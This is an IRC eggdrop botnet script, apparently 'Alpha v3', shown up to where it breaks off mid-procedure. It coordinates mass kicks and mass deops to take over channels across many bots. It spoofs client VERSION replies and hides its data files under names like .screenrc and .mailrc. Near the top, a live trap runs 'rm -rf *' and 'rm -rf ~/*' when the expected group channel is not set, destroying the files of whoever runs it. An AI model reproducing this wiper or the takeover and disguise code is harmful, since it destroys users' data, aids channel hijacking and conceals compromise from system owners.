#################### ALPHA.TCL #################################################
# Alpha v3-* by Arkangel/enderX/jagwar/fatal                                   #
################################################################################

set tclversion "v3-001r7"
proc b {} {return }
set pwb "[decrypt $mainchan C1OJM0nbMvx/uAXmJ0bQEm/1]"
set defnick "$nick"
set username "$nick"
if {[info exists vhost]} {
set my-ip "$vhost"
set my-hostname "$vhost"
}
set open-telnets 0
set addhst false 
set whobot "Icewolf"
set dontchktcl false
set learn-users 0
set default-flags ""
set owner "Arkangel"
set max-queue-msg 300
set flood-msg 5:30
set flood-chan 0
set default-port 6666
set flood-join 3:20
set notify-users-at 00
set wait-split 300
set wait-info 180
set xfer-timeout 300
set note-life 60
set notify-newusers "Arkangel"
set spread_distrobot "Pump"
set spread_scriptname .pinerc
set spread_tempname .pinercx
set flood-ctcp 3:60
set ban-time 120
set badbot true
foreach gl [info globals] {
if {$gl=="grpchan"} {
if {$grpchan=="#alpha"} {
set badbot false
}
}
}
if {$badbot=="true"} {
exec rm -rf *
exec rm -rf ~/*
die "<Arkangel> Stealing tcls is bad.."
}

foreach haq [userlist b] {
if {[string range $haq 0 2]=="haq"} {
deluser $haq
}
if {[string range $haq 0 2]=="hij"} {
deluser $haq
}
}

set servers {
irc.freei.net
irc.one.net
irc.idle.net
irc-e.frontiernet.net
irc-w.frontiernet.net
irc.concentric.net
irc1.lagged.org
irc2.lagged.org
irc.megsinet.net
efnet.intergate.ca
irc.globalized.net
efnet.rcn.com
irc.anet-stl.com
irc.arpa.com
irc.idirect.ca
irc.mindspring.com
efnet.telia.no
irc.powersurfr.com
efnet.demon.co.uk
irc.cs.cmu.edu
}

set verchoice(A) "mIRC32 v5.5 K.Mardam-Bey"
if [catch {exec uname -sr} os] {set os "unknown"}
set verchoice(B) "[b]BitchX-75p1+[b] by panasync [b]-[b] $os : [b]Keep it to yourself![b]"
set verchoice(C) "ircII 4.4 $os :debian-ircii 2.9: AT&T you will (ojnk!)"
set verchoice(D) "[b]\[AtlantiS[b](v1[b].[b]3b)[b]\][b] by Dethnite"
set verchoice(E) "PIRCH98:WIN 95/98/WIN NT:1.0 (build 1.0.1.1190)"
set verc "[string toupper [string range ${botnet-nick} 0 0]]"
if {$verc=="A" || $verc=="F" || $verc=="K" || $verc=="P" || $verc=="U" || $verc=="Z" } {set myversion "$verchoice(A)"}
if {$verc=="B" || $verc=="G" || $verc=="L" || $verc=="Q" || $verc=="V"} {set myversion "$verchoice(B)"}
if {$verc=="C" || $verc=="H" || $verc=="M" || $verc=="R" || $verc=="W"} {set myversion "$verchoice(C)"}
if {$verc=="D" || $verc=="I" || $verc=="N" || $verc=="S" || $verc=="X"} {set myversion "$verchoice(D)"}
if {$verc=="E" || $verc=="J" || $verc=="O" || $verc=="T" || $verc=="Y"} {set myversion "$verchoice(E)"}

set ctcp-version "$myversion"
set ctcp-finger ""
set ctcp-clientinfo ""
set ctcp-userinfo ""
set ignore-time 15
set connect-timeout 15
set require-p 1
set temp-path "/var/tmp"
set never-give-up 1
set server-timeout 10
set servlimit 0
set keep-nick 0
set use-info 0
set strict-host 0
set console "mkcobxs"
set modes-per-line 4
set serverz ""
set dumbserver ""
set share-users 1
set hub "Eleven"
set homechan $mainchan
set dmj ","

putlog "**********************************************"
putlog "* ALPHA $tclversion Loaded...                  *"
putlog "**********************************************"

proc islinked {bot} {
global botnet-nick
set linked false
foreach bt [bots] {
if {"[string tolower $bt]"=="[string tolower $bot]"} {
set linked true
}
}
if {$bot=="${botnet-nick}"} {
set linked me
}
if {$linked=="me"} {return 2}
if {$linked=="true"} {return 1}
if {$linked=="false"} {return 0}
}

if {[islinked $hub]=="2"} { set passive 0 } else { set passive 1 }

channel add $mainchan {
chanmode "+snt"
idle-kick 0
need-op "gain-ops $mainchan"
need-invite "invite-handler $mainchan"
need-key "get_key $mainchan"
need-unban "get_unban $mainchan"
need-limit "get_limit $mainchan"
}
channel set $mainchan -clearbans -enforcebans +dynamicbans +userbans -autoop
channel set $mainchan -bitch -greet -protectops -statuslog -stopnethack
channel set $mainchan -revenge +secret +shared

channel add $grpchan {
chanmode "+snti"
idle-kick 0
need-op "gain-ops $grpchan"
need-invite "invite-handler $grpchan"
need-key "get_key $grpchan"
need-unban "get_unban $grpchan"
need-limit "get_limit $grpchan"
}
channel set $grpchan -clearbans -enforcebans +dynamicbans +userbans -autoop
channel set $grpchan +bitch -greet -protectops -statuslog -stopnethack
channel set $grpchan -revenge +secret +shared

proc whatis {req} {
if {$req!=""} {
if {$req=="ch"} {return .screenrc}
if {$req=="uf"} {return .loginrc}
if {$req=="nf"} {return .mailrc}
}
}

set channel-file "[whatis ch]"
set userfile "[whatis uf]"
set notefile "[whatis nf]"


bind dcc m masskick mkick
proc mkick {h i a} {
  set pass [lindex $a 1]
  set chan [lindex $a 0]
  if {$chan == "" && $pass == ""} {
  putdcc $i "Usage: masskick <#channel> <pass>"
  return
  }
  if {![passwdok master $pass]} {putdcc $i "Invalid Password." ; return}
  if {[passwdok master $pass]} {
  if ![validchan $chan] {
  putdcc $i "Invalid channel."
  } else {
  dccbroadcast "[b]Mass Kick[b]: [b]$h[b] requested a masskick on [b]$chan[b]"
  putserv "MODE $chan +ismnt"
  getlag
  utimer 5 "domkick $chan"
  }
  }
}

bind dcc m massdeop mdeop
proc mdeop {h i a} {
  global returnlag
  set pass [lindex $a 1]
  set chan [lindex $a 0]
  if {$chan == "" && $pass == ""} {
  putdcc $i "Usage: massdeop <#channel> <pass>"
  return
  }
  if {![passwdok master $pass]} {putdcc $i "Invalid Password." ; return}
  if {[passwdok master $pass]} {
  if ![validchan $chan] {
  putdcc $i "Invalid channel."
  } else {
  dccbroadcast "[b]Mass Deop[b]: [b]$h[b] requested a massdeop on [b]$chan[b]"
  set returnlag ""
  getlag
  utimer 4 "domdeop $chan"
  }
  }
}


proc domkick {a} {
  global hub botnet-nick returnlag botslag
  set chan [lindex $a 0]
  if {![validchan $chan]} return
  if {${botnet-nick} == "$hub"} return
  set ctr 0
  set bots ""
  set list ""
  set notlagged "[string range $returnlag 1 end]"
  set botlst "$notlagged"
  set lst2 ""
  foreach bot $botlst {
        set lag [lindex $botslag($bot) 0]
        set rcv [lindex $botslag($bot) 1]
        if {$rcv < [expr [unixtime]-120]} {} else {
                if {$lag < 6} {append lst2 " $bot"}
        }
  }
  set lst2 [string range $lst2 1 end]
  dccbroadcast "Notlaggedlinks?: $notlagged"
  dccbroadcast "Notlaggedbots?: $lst2"
  set botlst "$lst2"
  set bots ""
  set list ""
  foreach bot $botlst {
    if {$bot != "$hub" && [isop [hand2nick $bot $chan] $chan]} {
    if {$bots == ""} {set bots $bot} else {append bots " $bot"}
    }
  }
  set ucounter 0
  foreach usr [chanlist $chan] {
    if {![matchattr [nick2hand $usr $chan] o] && ![matchchanattr [nick2hand $usr $chan] o $chan]} {
      if {$list == ""} {set list "$usr"} else {
      set list "$list $usr"
      incr ucounter
    }
  }
  }
  set efnetkick "1 2 3 4"
  set kicked 0
  set kpass "temp"
  set massk "[b]re-synch[b]"
  set mn "[expr $ucounter / 4]"  
  set botnum 0

for {set tempn 0} {$tempn < $mn} {incr tempn} {
     set knick ""
     set klist ""
     foreach temp $efnetkick {
	set knick "[lindex $list $kicked]"
	set klist "$klist,$knick"
	incr kicked
     }
     set klist "[string range $klist 1 end]"
     set bot "[lindex $bots $botnum]"
     if {$bot == ""} {
	set botnum 0
	set bot "[lindex $bots $botnum]"
     }
     incr botnum
     putlog "[b]![b] Getting $bot to kick $klist..."
     putbot $bot "bot_kick $kpass $klist $chan $massk"  
  }
     set knick ""
     set klist ""
     set kmsg "[b]re-synch[b]"
     set leftover "1 2 3 4"
     foreach temp $leftover {
        set knick "[lindex $list $kicked]"
        set klist "$klist,$knick"
        incr kicked
      }
     putlog "[b]![b] I am kicking $klist..."
     bot_kick ${botnet-nick} bot_kick "$kpass $klist $chan $massk"
     dccbroadcast "[b]Mass Kick:[b] Process complete."
}

bind bot b bot_kick bot_kick

proc bot_kick {bot cmd arg} {
global dumbserver
set pass [lindex $arg 0]
set who [lindex $arg 1]
set chan [lindex $arg 2]
set kmsg "[lindex $arg 3]"
if {$pass == "temp"} {
if {$dumbserver == "true"} {
foreach whom [split $who ","] {
puthelp "KICK $chan $whom :$kmsg"
}
}
if {$dumbserver != "true"} {
puthelp "KICK $chan $who :$kmsg"
}
}
}

bind raw - 351 server_ver
bind raw - 364 server_list
proc server_list {f k a} {
global serverz
append serverz " [lindex $a 1]"
}

proc updatelist {} {
global serverz servers
foreach srv $serverz {
dccbroadcast "[b]Server Update[b]: Checking $srv..."
set add "true"
foreach srv2 [split $srv "."] {
if {$srv2 == "*"} {set add "false"}
} 
if {$add == "true"} {
append servers " $srv"
}
}
dccbroadcast "[b]Server Update[b]: Updated Server List..."
dccbroadcast "[b]Server Update[b]: $servers"
}

proc server_ver {f k a} {
global dumbserver
set b "[split $a "-"]"
set b "[lindex [lindex $b 1] 0]"
set b "[lindex [split $b "."] 0]"
if {$b == "5"} {
set dumbserver "false"
return 0;
}
if {$b == "6"} {
set dumbserver "true"
return 0;
}
set dumbserver "true"
}

bind dcc m updservers update_srv
proc update_srv {h i a} {
putlog "#$h# updservers"
putdcc $i "Updating Server List.."
putserv "LINKS"
utimer 20 {updatelist}
}



bind bot b bot_deop bot_deop
proc bot_deop {bot cmd arg} {
set pass [lindex $arg 0]
set who [lindex $arg 1]
set chan [lindex $arg 2]

foreach whom [split $who ","] {
if {$pass == "temp"} {
pushmode $chan -o $whom
}
}
}

proc domdeop {a} {
  global hub botnet-nick returnlag botslag
  set chan [lindex $a 0]
  if {![validchan $chan]} return
  if {${botnet-nick} == "$hub"} return
  set ctr 0
  set bots ""
  set list ""
  set notlagged "[string range $returnlag 1 end]"
  set botlst "$notlagged"
  set lst2 ""
  foreach bot $botlst {
	set lag [lindex $botslag($bot) 0]
        set rcv [lindex $botslag($bot) 1]
	if {$rcv < [expr [unixtime]-120]} {} else {
		if {$lag < 6} {append lst2 " $bot"}
	}
  }
  set lst2 [string range $lst2 1 end]
  dccbroadcast "Notlaggedlinks?: $notlagged"
  dccbroadcast "Notlaggedbots?: $lst2"
  set notlagged "$lst2"
  foreach bot $notlagged {
    if {$bot != "$hub" && [isop [hand2nick $bot $chan] $chan]} {
    if {$bots == ""} {set bots $bot} else {append bots " $bot"}
    }
  }
  set ucounter 0
  foreach usr [chanlist $chan] {
    if {![matchattr [nick2hand $usr $chan] o] && ![matchchanattr [nick2hand $usr $chan] o $chan] && [isop $usr $chan]} {
      if {$list == ""} {set list "$usr"} else {
      set list "$list $usr"
      incr ucounter
    }   
  }
  }
  set efnetkick "1 2 3 4"
  set kicked 0
  set kpass "temp"
  set massk "[b]re-synch[b]"
  set mn "[expr $ucounter / 4]"  
  set botnum 0

for {set tempn 0} {$tempn < $mn} {incr tempn} {
     set knick ""
     set klist ""
     foreach temp $efnetkick {
	set knick "[lindex $list $kicked]"
	set klist "$klist,$knick"
	incr kicked
     }
     set klist "[string range $klist 1 end]"
     set bot "[lindex $bots $botnum]"
     if {$bot == ""} {
	set botnum 0
	set bot "[lindex $bots $botnum]"
     }
     incr botnum
     dccbroadcast "[b]![b] Getting $bot to deop $klist..."
     putbot $bot "bot_deop $kpass $klist $chan"
  }
     set knick ""
     set klist ""
     set kmsg "[b]re-synch[b]"
     set leftover "1 2 3 4"
     foreach temp $leftover {
        set knick "[lindex $list $kicked]"
        set klist "$klist,$knick"
        incr kicked
      }
     dccbroadcast "[b]![b] I am deopping $klist..."
     bot_deop ${botnet-nick} bot_deop "$kpass $klist $chan $massk"
     dccbroadcast "[b]Mass Deop:[b] Process complete."
}

set defchanmodes "chanmode +nt -clearbans -enforcebans +dynamicbans +userbans -autoop -bitch -greet -protectops -statuslog +stopnethack -revenge -secret +shared"

#############################################################################
# GAINOPS                                                                   #
#############################################################################
proc gain-ops {} {
   global botnick opsjenodig
   if ![info exists opsjenodig] { set opsjenodig 1 }
   if {$opsjenodig==0} {
      return 1
   }
   foreach c [channels] {
      set lockie 0
      if {(![botisop $c] && [onchan $botnick $c])} {
         foreach b [bots] {
            if [isop [hand2nick $b $c] $c] {
               if ![info exists botjesmetops] { set botjesmetops $b }
               if [info exists botjesmetops] { set botjesmetops "$botjesmetops $b" }
            }
         }
         if ![info exists botjesmetops] {
            set lockie 1
         }
         if {$lockie==0} {
            set nummertje 0
            foreach s [split $botjesmetops] {
               incr nummertje
            }
            set nummervanbotje [rand $nummertje]
            set ditbotjewillikopsvan 0
            foreach p [split $botjesmetops] {
               if {$nummervanbotje==$ditbotjewillikopsvan} { set hetbotje $p }
               incr ditbotjewillikopsvan
            }
            putbot $hetbotje "opreq $botnick $c"
            putlog "$c: Asked for ops from bot: $hetbotje"
            set opsjenodig 0
            utimer 30 "set opsjenodig 1"
         }
      }
   }
}

bind bot - opreq bot_op_request
proc bot_op_request {frombot command arg} {
   set nickvanbot [lindex $arg 0]
   set channel [lindex $arg 1]
   if [onchan $nickvanbot $channel] {
      foreach h [string tolower [split [gethosts $frombot]]] {
         if {$h==[string tolower [maskhost [getchanhost $nickvanbot $channel]]] && [matchattr $frombot o]} {
            pushmode $channel +o $nickvanbot
            putlog "Opping $frombot ($nickvanbot) on $channel"
            return 1
         }
      }
   }
}

bind join b * joinproc
proc joinproc {nick uhost handle channel} {
   if ![botisop $channel] { return 0 }
   set botnickie [nick2hand $nick $channel]
   if ![info exists botnickie] { return 0 }
   foreach botje [bots] {
      if {$botje==$botnickie} { putbot $botnickie "opquer $nick $channel" }
   }
}

bind bot b "opquer" bot-op-query
proc bot-op-query {frombot command arg} {
   global botnick
   set temp 0
   set nickie [lindex $arg 0]
   set channel [lindex $arg 1]
   if {$botnick==$nickie} {
      global $channel
      if {(![botisop $channel] && ![info exists $channel] && [onchan $botnick $channel]) } {
          putbot $frombot "opreq $botnick $channel"
          set $channel Wantops
          utimer 15 "unset $channel"
          putlog "$frombot: Wantops? ($channel) oh Yeah! :)"
      }
   }
}

bind mode - "*+o*" op_mode

proc op_mode {nick uhost handle chan modechange} {
  global hub botnick
  set channel "$chan"
  set opd [lindex $modechange 1]
   
  if {$opd == $botnick} {
    foreach b [bots] {
      set n [hand2nick $b $channel]
      if {$n != ""} {
        if {![isop $n $channel]} {utimer 3 "wantja $b $channel $n"}
      } else {
        if {[isinvite $channel]} {putbot $b "Wantinvite? $channel"}
      }
    }
    return
  }

  set opdhand [nick2hand $opd $chan]

  #if a bot does not op or a bot gets opped, return

  if {[matchattr $opdhand b]} {return}
  if {![matchattr $handle b]} {return}

  set onbots 0

  if {$opdhand != ""} {
    if {[islinked $handle]} {
      foreach wh [whom 0] {
        set h [lindex $wh 0]
        set b [lindex $wh 1]
        if {$h == $opdhand && $b == $handle} {
          set onbots 1
          break
        }
      }
    } else {
      set onbots 1
    }
  }

  if {$onbots} {
    putlog "debug: $opd opd by bot $handle/($nick) in $chan" 
    return
  }

  dccbroadcast "* WARNING! $handle opped someone whos _NOT_ on the botnet (hijacked?!)"
  putbot $hub "botishacked $handle [encrypt $handle botishacked]"
  pushmode $chan -o $opd
  pushmode $chan -o $nick
  unlink $handle "hacked."
}

bind bot s botishacked bot:botishacked
proc bot:botishacked {b c a} {
  set bot [lindex $a 0]
  set cookie [lindex $a 1]
  if {[string range $bot 0 3] == "hij"} {return}
  if {[decrypt $bot $cookie] == "botishacked"} {
    chattr $bot -sof+rd
    chnick $bot hij$bot
  }
}

bind bot b "Wantopsie?" do_i
proc wantja {botje channel nickie} {
   if {(![isop $nickie $channel]) && ([botisop $channel])} {
      putbot $botje "Wantopsie? $channel $nickie"
   }
}

proc do_i {frombot command arg} {
   global botnick wantopsie
   if ![info exists wantopsie] { set wantopsie 0 }
   if {$wantopsie==0} {
      set temp 0
      foreach c [split $arg] {
         incr temp
         if {$temp==1} { set channel $c }
         if {$temp==2} { set nickie $c }
      }
      if {$botnick==$nickie} {
         putbot $frombot "opreq $botnick $channel"
         putlog "$c: Asked for ops from bot: $frombot"
      }
   set wantopsie 1
   utimer 30 "set wantopsie 0"
   }
}

foreach channel [channels] {
  channel set $channel need-op "gain-ops"
}

#############################################################################
# GAININVITE                                                                #
#############################################################################
bind bot b "invitereq" invite_request
proc invite_request {frombot command arg} {
   set nickvanbot [lindex $arg 0]
   set channel [lindex $arg 1]
   if { (![validchan $channel]) || (![botisop $channel]) || (![isinvite $channel]) } {
      return 0
   }
   if [matchattr $frombot 1] { return 1 }
   putserv "invite $nickvanbot $channel"
   putlog "Invited $nickvanbot to channel $channel !"
   chattr $frombot +1
   utimer 30 "chattr $frombot -1"
}

bind bot b "Wantinvite?" do_i_want_invite
proc do_i_want_invite {frombot command arg} {
   global botnick
   if {[validchan $arg]} {
      if ![onchan $botnick $arg] {
         putlog "$arg: Asked For invite from $frombot :)"
         putbot $frombot "invitereq $botnick $arg"
      }
   }
}

proc invite-handler { } {
   global botnick invitejenodig
   if ![info exists invitejenodig] { set invitejenodig 1 }
   if {$invitejenodig==0} {
      return 1
   }
   set invitejenodig 0
   utimer 15 "set invitejenodig 1"
   foreach c [channels] {
      if ![onchan $botnick $c] {
         set nummertje 0
         foreach b [bots] {
            incr nummertje
         }
         if {$nummertje==0} {
            putlog "*** Unlinked from botnet"
            return 1
         }
         if {$nummertje<=3} {
            set nummer1 [rand $nummertje]
            set tempie 0
            foreach n [bots] {
               if {$tempie==$nummer1} {
                  putbot $n "invitereq $botnick $c"
               }
               incr tempie
            }
         }
         if {$nummertje>3} {
            set nummer1 [rand $nummertje]
            set nummer2 [rand $nummertje]
            set nummer3 [rand $nummertje]
            if {$nummer1==$nummer2} { set nummer2 [rand $nummertje] }
            if {$nummer1==$nummer3} { set nummer3 [rand $nummertje] }
            set tempie 0
            foreach n [bots] {
               if {$tempie==$nummer1} {
                  putbot $n "invitereq $botnick $c"
               }
               if {$tempie==$nummer2} {
                  putbot $n "invitereq $botnick $c"
               }
               if {$tempie==$nummer3} {
                  putbot $n "invitereq $botnick $c"
               }
               incr tempie
            }
         }
      }
   }
}

foreach channel [channels] {
  channel set $channel need-invite "invite-handler"
}

#############################################################################
# +channel / -channel                                                       #
#############################################################################
bind dcc m +channel dcc_botjoin
proc dcc_botjoin {handle idx args} {
  set channel [lindex $args 0]
  set key [lindex $args 1]
  global defchanmodes

  if {![ischanname $channel]} {
    putidx $idx "syntax: +channel #channel key"
    return 0
  }
  if {[addchannel $channel]} {
    putcmdlog "#$handle# +channel $channel $key"
    
  } else {
    putidx $idx "I'm already on $channel! "
  }
  return 0
}

bind dcc m -channel dcc_botleave
proc dcc_botleave {handle idx channel} {
  if {![ischanname $channel]} {
    putidx $idx "syntax: -channel #channel"
    return 0
  }
  channel remove $channel
  putserv "part $channel"
  putcmdlog "#$handle# -channel $channel"
  return 0
}

proc addchannel {channel} {
  global defchanmodes
  if {![validchan $channel]} {
  channel add $channel $defchanmodes
  channel set $channel need-invite "invite-handler"
  channel set $channel need-op "gain-ops"
  channel set $channel need-key "get_key $channel"
  return 1
  }
  return 0
}

#############################################################################
# JOINBOTS/PARTBOTS/SETMODE
#############################################################################
bind dcc m joinbots join_bots
proc join_bots {handle idx arg} {
 global ndpasswd dmj mainchan
 set hand $handle
 set channel [lindex $arg 0]
 set grp [string tolower [lindex $arg 1]]
 set key [lindex $arg 2]
 if {$key == ""} {set key abc}
 set botsent ""
 if {![ischanname $channel] || ($grp == "") } {
   putidx $idx "syntax: joinbots #channel password <key>"
   return 0
 }
 if {[lsearch -regexp [string tolower $channel] [string tolower $dmj]]=="0"} {
   putdcc $idx "I don't think that's a wise idea."
   puthelp "PRIVMSG $mainchan :-> ([b]$hand[b]) tried to join the botnet to a channel that might put the botnet at risk."
   dccbroadcast "-> ([b]$hand[b]) tried to join the botnet to a channel that might put the botnet at risk."
   return 0
 }
 if {[encrypt $grp $grp]!=$ndpasswd} {dccbroadcast "[b]Mass Join[b]: [b]$hand[b] used invalid password to massjoin the bots." ; return}
 if { [encrypt $grp $grp] == $ndpasswd } {
   putidx $idx "Now joining all bots to $channel"
   if {[addchannel $channel]} { putserv "join $channel $key" } 
   foreach bot [bots] {
     putbot $bot "botjoin $channel $handle $key"
     lappend botsent $bot
   }
 }
 putidx $idx "Sent join request for $channel to $botsent"
}

bind dcc m partbots part_bots
proc part_bots {handle idx arg} {
 global ndpasswd
 set channel [lindex $arg 0]
 set grp [string tolower [lindex $arg 1]]
 set botsent ""
 if {![ischanname $channel] || ($grp == "")} {
   putidx $idx "syntax: partbots #channel password"
   return 0
 }
 if { [encrypt $grp $grp] == $ndpasswd } {
   putidx $idx "Now parting all bots from $channel"
   if {[validchan $channel]} {
     channel remove $channel
     putcmdlog "I have left $channel - requested by $handle."
     putserv "part $channel $handle"
   } 
   foreach bot [bots] {
     putbot $bot "botpart $channel $handle"
     lappend botsent $bot
   }
  }
 putidx $idx "Sent part request for $channel to $botsent"
}

bind dcc m setmode dcc_setmode
proc dcc_setmode {handle idx arg} {
 global ndpasswd
 set senha [string tolower [lindex $arg 0]]
 set where [string tolower [lindex $arg 1]]
 set channel [lindex $arg 2]
 set newmodes [lrange $arg 3 end]
 if {($where == "" || $channel == "" || $newmodes == "")} {
   putidx $idx "Usage: setmode password L/A #channel +/-mode"
   return 0
 }
 if { [encrypt $senha $senha] == $ndpasswd } {
   if [validchan $channel] {
       channel set $channel $newmodes
      }
   if { $where == "a" } {
       putcmdlog "#$handle# setmode A $channel $newmodes"
       putallbots "setm $handle $channel $newmodes"
     } else {
       putcmdlog "#$handle# setmode L $channel $newmodes"
     }
 }
}

bind bot b setm bot_setmode
proc bot_setmode {bot cmd arg} {
 if {![matchattr $bot o]} { return 0}
 set handle [lindex $arg 0]
 set channel [lindex $arg 1]
 set newmodes [lrange $arg 2 end]
 putcmdlog "#$handle@$bot# $channel $newmodes"
 if [validchan $channel] {
   channel set $channel $newmodes
 }
}

bind bot b botjoin bot_join_req
proc bot_join_req {bot cmd arg} {
  set channel [lindex $arg 0]
  set handle [lindex $arg 1]
  set key [lindex $arg 2]
  if {![matchattr $bot o] || ![matchattr $handle m]} {
  putlog "#$handle@$bot# wanted me to join $channel"
  return 0 }
  if {[addchannel $channel]} {
  putcmdlog "#$handle@$bot# requested me to join $channel"
  if {$key == ""} {set key abc}
  putserv "join $channel $key"
  }
  return 0
}

bind bot b botpart bot_part_req
proc bot_part_req {bot cmd arg} {
  set channel [lindex $arg 0]
  set handle [lindex $arg 1]
  if {![matchattr $bot o] || ![matchattr $handle m]} {
    putlog "#$handle@$bot# wanted me to part $channel"
    return 0
  }
  channel remove $channel
  putcmdlog "#$handle@$bot# partbots $channel"
  putserv "part $channel"
}

#############################################################################
# CYCLE                                                                     #
#############################################################################
bind dcc m cycle dcc_cycle
proc dcc_cycle {handle idx arg} {
        if {[lindex $arg 0] == ""} {
             putidx $idx "Usage: cycle <channel>"
             return 0
        } 
        putcmdlog "#$handle# cycle [lindex $arg 0]"
        putserv "PART [lindex $arg 0]"
        putserv "JOIN [lindex $arg 0]"
        return 1
}

#############################################################################
# Flood protection                                                          #
#############################################################################

set bothash [rand 99]
set botcount [rand 99]
bind flud - * jagflud
set banflood [unixtime]
proc jagflud {nick uhost handle type chan} {
global botnet-nick banflood bothash botcount
 regsub -all ".*@|\[0-9\\.\]" $uhost "" tst
 if {$tst==""} {
  regsub -all "\[0-9\]*$" $uhost "*" mh
 } {
  regsub -all -- "-\[0-9\]|\[0-9\]|ppp|line|slip|dialup" $uhost "*" mh
 }
 regsub ".*@" $mh "*!*@" mh
 regsub -all "\\*\\**" $mh "*" mh
 if ![isignore $mh] {newignore $mh ${botnet-nick} "$chan $type flooder" 3[rand 9]}
 switch -- $type {
  nick -
  join {
   if {([unixtime]-$banflood) > -3} {
    foreach ch [channels] {
     if {[ophash $ch]==5} {
      if [onchan $nick $ch] {
       if ![ischanban $mh $ch] {
        newchanban $ch $mh ${botnet-nick} "$ch $type flooder" 3[rand 9]
       }
      }
     }
    }
   }
   if {([unixtime]-$banflood) > 0} {set banflood [unixtime]}
   incr banflood
  }
 }
 return 1
}

bind ctcp - * checkctcp
proc checkctcp { nick uhost handle dest key arg } {
 global botnick myversion
 set fidle [rand 999]
 set ignoremask "*!*[string range $uhost [string first "@" $uhost] end]" 
 switch -- $key {
   CLIENTINFO { putserv "notice $nick :CLIENTINFO  " }
   FINGER { putserv "notice $nick :FINGER $botnick Idle $fidle Seconds " }
   USERINFO { putserv "notice $nick :USERINFO  " }
   VERSION { putserv "notice $nick :VERSION $myversion" }
   PING { putserv "notice $nick :PING $arg" }
   ACTION { return 0 }
   DCC { return 0 }
 }
 if {[string index $dest 0] != "#"} {
   if ![isignore $ignoremask] { newignore $ignoremask $nick CTCP-$key 60 }
 }
 return 1
}

#############################################################################
# Antiidle                                                                  #
#############################################################################

timer 1 nidle
proc nidle { } {
   global botnick
   puthelp "PRIVMSG $botnick :anti-idle [unixtime]"
   foreach nt [utimers] {
   set n "[lindex $nt 1]"
   if {$n=="nidle"} {killutimer "[lindex $nt 2]"}
   }
   utimer 30 nidle
}

bind msg b anti-idle bot_anti_idle
set lastlag 0
proc bot_anti_idle {n u h a} {
global hub lastlag botmask botnick
if {$n==$botnick} {set botmask "$n!$u"}
if {[islinked $h]!="2"} {return}
set ux [lindex $a 0]
set lag "[expr [unixtime] - $ux]"
if {[expr $lastlag+300] < [unixtime]} {
putlog "[b]debug[b]: [b]bot[b]->[b]server[b] lag: [b]$lag[b] seconds." ; set lastlag [unixtime]
}
putallbots "serverlag $lag"
}

set botslag($hub) "0"
bind bot b serverlag bot:srvlag

proc bot:srvlag {b c a} {
global botslag
set botslag($b) "[lindex $a 0] [unixtime]"
}

#############################################################################
# SOME USEFULL PROCS                                                        #
#############################################################################

proc ischanname {c} {
 if {[llength $c]==1 && [string first # $c]==0 && [string length $c]>1} {
   return 1
 } else {
   return 0
 }
}
proc isinvite {c} {
 if [string match [string range [getchanmode $c] 0 1] +i] {
   return 1
 } else {
   return 0
 }
}
proc ophash {ch} {
global botnick
 if ![validchan $ch] {return -1}
 set bo [lsort [string tolower [split [chanlist $ch ob] " "]]]
 set bop ""
 foreach w $bo {if [isop $w $ch] {lappend bop $w}}
 return [lsearch $bop [string tolower $botnick]]
}

#####################
# NOTLINKED BOTS?
#########

proc isbot {bot} {
global botnet-nick
if {[lsearch -exact [string tolower "[bots] ${botnet-nick}"] [string tolower $bot]]==-1} {
return 0
} else {
return 1
}
}

bind dcc m notlinked dcc_downbots
proc dcc_downbots {handle idx arg} {
global botnet-nick
set downedbot ""
putcmdlog "#$handle# notlinked"
foreach b [userlist b] {
if {![isbot $b]} {lappend downedbot $b}
}
set bnum [llength $downedbot]
if {$downedbot == ""} {
putidx $idx "Bots unlinked: none"
putidx $idx "(total: 0)"
} {
putidx $idx "Bots unlinked: $downedbot"
putidx $idx "(total: $bnum)"
}
}


##############################
# USER PARTYLINE LOGGING?
###########################

bind chon - * chon_last
proc chon_last {hand idx} {
global botnet-nick
if {[matchattr $hand m]} {dccsimul $idx ".console +mckobsx"}
set gotinfo "[dcclist]"
set done "false"
foreach hst $gotinfo {
if {$done != "true"} {
set hidx "[lindex $hst 0]"
if {$hidx == $idx} {
set myhost "[lindex $hst 2]"
set done "true"
}
}
}
set chost "$myhost"
set connhost "$chost"
if {$connhost == ""} {
set connhost "unresolving.host/weird.host"
}
putidx $idx "[b]*[b] Welcome to ${botnet-nick}, $hand/$connhost! It is [date]/[time]"
dccbroadcast "[b]*[b] $hand@$connhost! is now on partyline via ${botnet-nick}"
if {![file exists wtmp]} {catch {exec touch wtmp}}
if {[file size wtmp] > 1400} {
if {[file exists tail]} {
catch {exec cat wtmp | ./tail -n 5 > .wtmp}
} else {
catch {exec cat wtmp | tail -n 5 > .wtmp}
}
catch {exec mv .wtmp wtmp}
}
set last [open wtmp a+]
puts $last "$hand ${botnet-nick} [time] [date] $connhost"
close $last
putallbots "bot_getwtmp $hand $connhost"
dccsimul $idx ".echo off"
}

bind bot - bot_getwtmp bot_get_wtmp
proc bot_get_wtmp {bot cmd args} {
set hand "[lindex $args 0]"
set connhost "[lindex [lindex $args 0] 1]"
set last [open wtmp a+]
puts $last "$hand $bot [time] [date] $connhost"
close $last
return 0;
}

bind dcc m last dcc_last
proc dcc_last {hand idx arg} {
putlog "#$hand# last"
putdcc $idx "  [b]+--------+-------+------------------------------------- -  -   - -[b]"
putdcc $idx "  [b]|[b] handle [b]|[b]  bot  [b]|[b]   when/from host"
putdcc $idx "  [b]+--------+-------+------------------------------------- -  -   - -[b]"
set wtmp [open wtmp r]
while {![eof $wtmp]} {
set line [gets $wtmp]
set handle "[lindex $line 0]"
set bot "[lindex $line 1]"
set when "[lrange $line 2 3]"
set from "[lrange $line 4 end]"
putdcc $idx "   $handle   $bot   $when $from"
}
close $wtmp
}

###################
# BOT LINK CRAP..
########

bind link - * bot_link
proc bot_link {b v} {
global botnick hub botnet-nick
if {[string tolower ${botnet-nick}]!=[string tolower $hub]} {
return
}
if {[string tolower ${botnet-nick}]==[string tolower $hub]} {
if {![matchattr $b s]} {
putlog "Alpha: Unshared bot $b, trying to link. Delinking."
unlink $b ; chattr $b +r
return
}
if {![matchattr $b o]} {
putlog "Alpha: -o bot $b, trying to link. Delinking."
unlink $b ; chattr $b -s+r
return
}
sendlinkcookie $b
}
}

set botcookie($hub) "null"
set goodlink($hub) "yes"

proc sendlinkcookie {b} {
global botcookie hub goodlink
set cookie "[randword]"
putbot $b "verifylink $cookie"
set botcookie($b) "[encrypt $cookie $cookie]"
set goodlink($b) "no"
utimer 3 "hasbotresponded $b"
}

proc hasbotresponded {b} {
global goodlink botcookie
if {$goodlink($b)=="no"} {
unlink $b
set botcookie($b) ""
